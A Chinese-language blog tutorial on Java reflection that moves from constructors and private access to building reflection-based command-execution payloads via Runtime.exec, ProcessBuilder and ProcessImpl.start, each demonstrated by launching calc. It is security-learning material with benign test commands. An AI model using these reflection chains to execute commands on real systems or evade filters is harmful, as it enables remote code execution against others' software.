getDeclaredConstructor(Class\u0026hellip;)：匹配和参数配型相符的构造函数 Reflection.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package java_foundation; public class Reflection { private String name; public int age; public Reflection(){ System.out.println(\u0026#34;调用无参构造函数\u0026#34;); } public Reflection(String name){ System.out.println(\u0026#34;调用有参构造函数\u0026#34;+name); } private Reflection(int age){ this.age=age; System.out.println(\u0026#34;调用私有构造函数\u0026#34;+age); } public int getAge(){ return this.age; } } Main.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package java_foundation; import java.lang.Class; import java.lang.reflect.Constructor; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Constructor[] constructor = clazz.getDeclaredConstructors(); for(Constructor x:constructor){ System.out.println(x); } System.out.println(\u0026#34;===============\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(String.class); System.out.println(constructor1); //简单利用，实例化对象： constructor1.newInstance(\u0026#34;fupanc\u0026#34;); System.out.println(\u0026#34;===============\u0026#34;); Constructor constructor2 = clazz.getDeclaredConstructor(int.class); System.out.println(constructor2); constructor2.setAccessible(true); Reflection o = (Reflection)constructor2.newInstance(12345); System.out.println(o.getAge()); } } 输出为：\n1 2 3 4 5 6 7 8 9 10 private java_foundation.Reflection(int) public java_foundation.Reflection(java.lang.String) public java_foundation.Reflection() =============== public java_foundation.Reflection(java.lang.String) 调用有参构造函数fupanc =============== private java_foundation.Reflection(int) 调用私有构造函数12345 12345 调用private修饰的Constructor时，必须首先通过setAccessible(true)设置允许访问。\n获取继承关系 获取父类\n1 Class.getSuperclass() 获取interface\n1 Class.getInterface() 反射创建类对象 其实这个已经在前面代码的示例中已经利用过滤，只要把前面代码看懂这个板块就没有问题。直接给代码：\n1 2 Class ctf = Class.forName(\u0026#34;Main\u0026#34;); // 创建Class对象 Main o = (Main)ctf.newInstance(); // 创建类对象 则o就是对应的类对象。\n这里调用的这个类的无参构造函数，但是不一定可以使用成功，原因可能为：\n使用的类没有无参构造函数 使用的类构造函数是私有的 注意如果没有无参构造方法，可以使用Constructor.newInstance()来实例化一个类对象。如下：\n1 2 3 4 5 //public Main(String name)作为构造函数： Class clazz = Class.forName(\u0026#34;Main\u0026#34;); clazz.getMethod(\u0026#34;setName\u0026#34;,String.class).invoke(clazz.getConstructor(String.class).newInstance(\u0026#34;admin\u0026#34;),\u0026#34;haha\u0026#34;); //当没有权限访问时可以调用constructor.setAccessible(true)来创建出类实例 利用反射进行命令执行 利用Runtime类 java.lang.Runtime 中有一个exec方法可以执行本地命令，但是不能如下直接构造来执行命令：\n1 2 3 4 5 6 7 8 9 10 11 12 import java.lang.reflect.*; public class Text { public static void main(String[] args) throws Exception{ Class ctf = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Method method1 = ctf.getDeclaredMethod(\u0026#34;exec\u0026#34;,String.class); method1.invoke(ctf.newInstance(),\u0026#34;id\u0026#34;); } } //中间代码可以简化如下，并且不需要导包，需要注意一下： Class ctf = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); ctf.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(ctf.newInstance(), \u0026#34;id\u0026#34;); 这样会报错\n1 2 3 4 5 Exception in thread \u0026#34;main\u0026#34; java.lang.IllegalAccessException: class Text cannot access a member of class java.lang.Runtime (in module java.base) with modifiers \u0026#34;private\u0026#34; at java.base/jdk.internal.reflect.Reflection.newIllegalAccessException(Reflection.java:361) at java.base/jdk.internal.reflect.Reflection.ensureMemberAccess(Reflection.java:99) at java.base/java.lang.Class.newInstance(Class.java:579) at Text.main(Text.java:5) 原因就是Runtime类的构造方法是私有的，导致这样ctf.newInstance()直接调用是错误的。\n可以看一下源码\n可以看到有一个getRuntime()方法可以获取到对象，这种设计就是“单例模式”，这里可以使用一个静态方法来获取对象，所以在这里我们只能通过Runtime.getRuntime()来获取到Runtime对象。\n这里Runtime.getRuntime()是一个静态方法，所以在使用invoke执行方法时，第一个参数需要传入一个Runtime类,所以可以将代码改成如下来执行：\n1 2 3 4 5 6 7 8 9 10 11 package java_foundation; import java.lang.Runtime; public class Main { public static void main(String[] args) throws Exception{ Class clazz = Runtime.class; clazz.getDeclaredMethod(\u0026#34;exec\u0026#34;,String.class).invoke(clazz.getDeclaredMethod(\u0026#34;getRuntime\u0026#34;).invoke(null),\u0026#34;calc\u0026#34;); } } //成功弹出计算机 还可以通过setAccessible(true)获得访问权限，全反射调用的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 import java.lang.reflect.*; public class Text{ public static void main(String[] args) throws Exception{ Class ctf = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Constructor constructor1 = ctf.getDeclaredConstructor(); constructor1.setAccessible(true); Object o = constructor1.newInstance(); Method method1 = ctf.getMethod(\u0026#34;getRuntime\u0026#34;); Object x = method1.invoke(o); Method method2 = ctf.getMethod(\u0026#34;exec\u0026#34;,String.class); method2.invoke(x,\u0026#34;calc\u0026#34;); } } 最后虽然弹出警告但是成功弹出计算机\n1 2 3 4 5 WARNING: An illegal reflective access operation has occurred WARNING: Illegal reflective access by Text (file:/D:/java_text/java-1/out/production/java-1/) to constructor java.lang.Runtime() WARNING: Please consider reporting this to the maintainers of Text WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations WARNING: All illegal access operations will be denied in a future release 其实直接如下利用即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package java_foundation; import java.lang.Class; import java.lang.reflect.Constructor; import java.lang.Runtime; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;).getDeclaredConstructor(); constructor.setAccessible(true); Runtime rt = (Runtime)constructor.newInstance(); rt.exec(\u0026#34;calc\u0026#34;); } } 但是上面的全利用反射来利用还是需要学习一下。\n其他类与方法利用 现在直接使用Runtime.getRuntime().exec(cmd)的调用其实已经不太好找了，在这里看到了一篇文章，也是拓展了我的思路，这里我们还可以通过跟进Runtiem类的exec()方法的底层调用过程来完成RCE功能的实现。\n现在还是来调试一下，看看这里的底层实现以及自己构建代码。\n基本测试类：\nMain.java：\n1 2 3 4 5 6 7 8 9 10 package java_foundation; import java.lang.Runtime; public class Main { public static void main(String[] args) throws Exception{ Runtime rt = Runtime.getRuntime(); rt.exec(\u0026#34;calc\u0026#34;); } } 运行成功弹出计算机。\n调试过程 跟进代码中的exec()方法，然后打断点：\n开始调试：\n然后调用了重载的exec()方法：\n又调用了重载的exec()方法：\n然后这里就实例化了一个方法来执行这个过程。在这里我调试时发现其实这里直接return这个ProcessBuilder类后直接就弹出了计算机，说明其实这里就是一个可以直接进行命令执行的地方。所以这里就有一个可以利用的点，直接根据这里的点来构造一个简单的payload，第一构造点了，但是后面再说明。这里继续跟代码：\n然后就是实例化了ProcessBuilder类：\n可以看出来这个command是一个数组类型的值，并且这里add过后的值也可以调试看一下：\n。继续往后面走，调用了environment()方法：\n这里其实就是直接返回的前面的ProcessBuilder类实例，没有其他操作。\n然后调用了directory()方法：\n一个简单的赋值操作，然后返回了ProcessBuilder类实例。\n最后调用了start()方法：\n代码逻辑简单跟一下，还是能看懂，主要调用的就是下面的ProcessImpl类的start()方法，并且这里在执行这个方法后弹出计算机，所以这里也是第二个构造点。现在还是不谈，后面再具体分析。\n在这里就是调用了ProcessImpl类的start()方法，这里看一下ProcessImpl类的start()方法的定义：\n就是这个static修饰符，让这个start()方法可以直接被调用。那么现在再继续跟进这里的start()方法，参数传递情况：\n简单跟了一下，其实最后调用的还是如下代码：\n调试过后发现这里也是直接实例化这个过程然后弹出计算机，这里的参数传递：\n所以这里又是第三构造方法。（感觉其实这里都是一层套一层，主要是参数的传递吧）。\n再继续跟进，现在来到了ProcessImpl类的初始化过程：\n所以会进入第一个if语句，就是将allowAmbiguousCommands设置为true，以及value最终值为null，然后就退出第一个if条件，随后正好就进入了第二个if条件，这里就不细跟第二个if条件了，最后退出这个if条件，将调用create()方法：\n当跳过这个create()方法就弹出计算机，说明这里也是可以利用的，第四构造点。那么现在继续跟进这个create()方法，但是一直跟不进去，alt+shift+F7强制步入也进不了。简单跟进是对应的如下方法：\n上面也是有方法说明的，大概意思就是会使用win32函数来创建进程，这里就有点太底层了。并由由于操作系统的不同，这分析出来的主要是windows系统下，对于linux系统下的利用也就会有不同，不再往下跟了。\n总结一下前面的几个构造点：\nnew ProcessBuilder(cmdarray).environment(envp).directory(dir).start() ProcessImpl类的start()方法。 大概就是这两个，因为linux和windows两个操作系统的不同，在第三个构造点就开始有不同代码了，如果是打linux环境也许还有更多的paylaod，这个就到时候再具体跟吧。这里就只说明这两个方法，具体区别可以看一下参考文章。\n利用ProcessBuilder 对应代码：\njava.lang.ProcessBuilder类用于创建操作系统进程， 还是调试代码看需要哪些参数：\n首先就是新建了ProcessBuilder类实例，重点是注意参数类型以及参数的传递，先是实例化了ProcessBuilder类：\n然后将这个command变量设置为了一个数组类型的变量。\n然后调用了environment()方法，但是没啥用，其实就是将ProcessBuilder类的environment变量设置为null。\n然后调用了directory()方法，同样其实就是一个将ProcessBuilder类的directory变量设置为null。\n最后调用了start()方法完成命令的执行。\n但是其实对于中间两个变量的设置，其实在ProcessBuilder类初始化后就已经符合条件了：\n所以其实只用获取构造器和start()方法即可。但这里要说明一个点：Java中的可变长参数，当定义函数的时候不确定参数数量的时候，可以使用...这样的语法来表示”这个函数的参数个数是可变的“。同时对于可变长参数，Java在编译时会编译成一个数组，所有说下面这两种写法在底层其实是等价的：\n1 2 public void hello(String[] names){} public void hello(String...name){} 对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了。\n那么可以如下构造paylaod：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package java_foundation; import java.lang.reflect.Constructor; import java.lang.reflect.Method; public class MyTest { public static void main(String[] args) throws Exception{ String[] cmd = new String[]{\u0026#34;calc\u0026#34;}; String className = \u0026#34;java.lang.ProcessBuilder\u0026#34;; Class clazz = Class.forName(className); Constructor constructor = clazz.getDeclaredConstructor(String[].class); Method method = clazz.getDeclaredMethod(\u0026#34;start\u0026#34;,null); method.invoke(constructor.newInstance(cmd)); } } 但是报错：\n1 2 3 4 5 6 Exception in thread \u0026#34;main\u0026#34; java.lang.IllegalArgumentException: argument type mismatch at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:422) at java_foundation.MyTest.main(MyTest.java:13) 也算积累经验了，一直在看语法，结果问报错一下就解决了，这里的基本的大部分语法是没有错误的，主要还是可变参数的原因。即ProcessBuilder类的构造函数：\n这里就直接继承一个固定的吧，也就是说。我在反射时获取了正确的构造函数String[].class，但是在实例化时有区别，主要是因为 可变参数 (varargs) 和 数组类型 在 Java 反射中的处理方式稍微不同。就是在调用newInstance()方法时，Java会将可变参数视为一个Object[]类型，而不是直接的String[]。所以这里需要强制类型转换为Object类型。所以正确的利用方法如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //原利用思路：new ProcessBuilder(new String[]{\u0026#34;calc\u0026#34;}).start(); package java_foundation; import java.lang.reflect.Constructor; import java.lang.reflect.Method; public class MyTest { public static void main(String[] args) throws Exception{ String[] cmd = new String[]{\u0026#34;calc\u0026#34;}; String className = \u0026#34;java.lang.ProcessBuilder\u0026#34;; Class clazz = Class.forName(className); Constructor constructor = clazz.getDeclaredConstructor(String[].class); Method method = clazz.getDeclaredMethod(\u0026#34;start\u0026#34;,null); method.invoke(constructor.newInstance((Object)cmd)); } } 成功弹出计算机，并且只使用反射的条件。还可以如下进行说明传参：\n我们将字符串数组的类String[].class传给getConstructor即可，此时就获取到了参数为数组类型的newInstance()，在调用newInstance的时候，因为本身接收的是一个可变长参数（即一个数组），并且需要我们传给 ProcessBuilder构造器的参数的是一个List\u0026lt;String\u0026gt;类型，二者叠加为一个二维数组,最终payload如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 import java.lang.reflect.*; public class Text{ public static void main(String[] args) throws Exception{ Class ctf = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); Constructor constructor1 = ctf.getConstructor(String[].class); Object o = constructor1.newInstance(new String[][]{{\u0026#34;calc\u0026#34;}}); Method method1 = ctf.getMethod(\u0026#34;start\u0026#34;); method1.invoke(o); } } /*中间代码精简： Class ctf = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); ctf.getMethod(\u0026#34;start\u0026#34;).invoke(ctf.getConstructor(String[].class).newInstance(new String[][]{{\u0026#34;calc\u0026#34;}})); 说一点点代码：\n对于new String[][]{{\u0026quot;calc\u0026quot;}}：这里使用 new 关键字创建并初始化一个二维字符串数组，确保参数类型正确匹配 。 然后在其他文章中看到了另外一个有意思的paylaod，直接看吧：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.List; import java.util.Arrays; public class MyTest { public static void main(String[] args) throws Exception{ Class ctf = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); Constructor constructor1 = ctf.getConstructor(List.class); Object o = constructor1.newInstance(Arrays.asList(\u0026#34;calc\u0026#34;)); Method method1 = ctf.getMethod(\u0026#34;start\u0026#34;); method1.invoke(o); } } /*成功弹计算机 中间代码精炼一下就是（这样就不用导lang下的包）： Class ctf = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); ctf.getMethod(\u0026#34;start\u0026#34;).invoke(ctf.getConstructor(List.class).newInstance(Arrays.asList(\u0026#34;calc\u0026#34;))); 这里主要就是利用的另外一个构造函数来构造的payload：\n因为这两个构造函数其实最后都是直接作用与它的command变量，也就是我们要传入的命令，这里同样可以通过获取相应的构造函数并传入相应的值来执行命令。具体就看上面的代码了，不多赘述。\nProcessImpl#start() 对应代码：\n这里其实就是对应的ProcessBuilder类调用的start()方法，也就是前一个调用方法的更深一层但是这里对应的类是不一样的，所以可以利用。\n对于这里直接调用的ProcessImpl类的start()方法，这里是因为这个类的start()方法是一个静态方法，同样直接打就行了，对应的参数传递情况：\n所以直接打就行：\n1 2 3 4 5 6 7 8 9 10 11 12 13 package java_foundation; import java.lang.reflect.Method; import java.util.Map; public class MyTest { public static void main(String[] args) throws Exception{ String name = \u0026#34;java.lang.ProcessImpl\u0026#34;; String[] cmd = {\u0026#34;calc\u0026#34;}; Method method = Class.forName(name).getDeclaredMethod(\u0026#34;start\u0026#34;, String[].class, Map.class,String.class, ProcessBuilder.Redirect[].class, boolean.class); method.invoke(null,cmd,null,null,null,false); } } 报错：\n1 2 3 Exception in thread \u0026#34;main\u0026#34; java.lang.NoSuchMethodException: java.lang.ProcessImpl.start([Ljava.lang.String;, java.util.Map, java.lang.String, java.lang.ProcessBuilder$Redirect, boolean) at java.lang.Class.getDeclaredMethod(Class.java:2130) at java_foundation.MyTest.main(MyTest.java:10) 虽然这个start()方法没有定义为私有类型：\n但是这个start()方法所处的ProcessImpl类是final类型的的，并且都不能直接import引入，所以需要通过setAccessible(true);来让其可以访问。\n所以最终代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package java_foundation; import java.lang.reflect.Method; import java.util.Map; public class MyTest { public static void main(String[] args) throws Exception{ String name = \u0026#34;java.lang.ProcessImpl\u0026#34;; String[] cmd = {\u0026#34;calc\u0026#34;}; Method method = Class.forName(name).getDeclaredMethod(\u0026#34;start\u0026#34;, String[].class, Map.class,String.class, ProcessBuilder.Redirect[].class, boolean.class); method.setAccessible(true); method.invoke(null,cmd,null,null,null,false); } } 成功弹出计算机。\n这里只分析了通用的两个payload，对于linux环境当然还可以打其他的方式，具体看参考文章。\n参考文章：\nhttps://www.cnblogs.com/Nestar/p/17335689.html\nhttps://xz.aliyun.com/t/12446?time__1311=GqGxRQ0%3DitqiqGN4eeT4QwqWqrvD9BjiZaoD\n","date":"2024-06-19T21:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/","title":"Java反射机制"}]